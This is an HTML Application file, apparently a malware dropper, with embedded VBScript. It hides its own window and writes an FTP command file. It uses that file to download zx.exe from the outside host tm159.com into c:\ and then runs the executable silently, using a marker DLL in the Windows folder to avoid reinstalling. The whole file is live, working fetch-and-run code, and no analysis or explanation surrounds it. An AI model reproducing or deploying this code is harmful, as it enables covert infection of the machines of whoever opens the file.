<html>
<HTA:APPLICATION  caption="no" border="none" showInTaskBar="no" windowState="minimize" width=0 height=0>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B' width=0 height=0></object>
<script language="VBScript">
Dim fs, t, FtpSite, UserName, UserPass, LocalPath, FileName, WinDir, DllFullName 
FtpSite="tm159.com"
UserName="tm159.com"
UserPass="tm159.com"
LocalPath="c:\"
SourceFile="zx.exe"
DestFile="zx.exe"
Set fs = CreateObject("Scripting.FileSystemObject")
WinDir = fs.GetSpecialFolder(0)
DllFullName = WinDir+"\Downloaded program files\ieubtm159.dll"
Set t = fs.CreateTextFile("zx.txt",True)
t.WriteLine("open "&FtpSite)
t.WriteLine(UserName)
t.WriteLine(UserPass)
t.WriteLine("bin")
t.WriteLine("lcd "&LocalPath)
t.WriteLine("get "&SourceFile&" "&DestFile)
t.WriteLine("bye")
t.Close
if Not fs.FileExists(DllFullName) then
  wsh.Run "ftp -s:zx.txt",0,true
  if fs.FileExists(LocalPath&DestFile)  then
    wsh.Run LocalPath&DestFile,0,true
  end if
end if
window.close
</script>
</html>